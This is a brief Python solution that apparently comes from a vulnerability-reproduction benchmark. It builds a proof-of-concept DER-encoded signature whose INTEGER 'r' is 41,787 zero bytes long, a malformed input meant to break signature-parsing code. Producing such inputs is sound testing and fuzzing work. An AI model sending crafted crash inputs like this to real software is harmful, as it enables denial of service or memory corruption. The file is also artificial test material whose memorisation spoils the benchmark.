class Solution:
    def solve(self, src_path: str) -> bytes:
        r_bytes = b'\x00' * 41787
        len_r_value = (41787).to_bytes(2, 'big')
        len_r_field = b'\x82' + len_r_value
        tag_r = b'\x02'
        s_tag = b'\x02'
        len_s = b'\x01'
        s_bytes = b'\x00'
        content = tag_r + len_r_field + r_bytes + s_tag + len_s + s_bytes
        content_len = len(content)
        len_seq_value = content_len.to_bytes(2, 'big')
        len_seq_field = b'\x82' + len_seq_value
        tag_seq = b'\x30'
        poc = tag_seq + len_seq_field + content
        return poc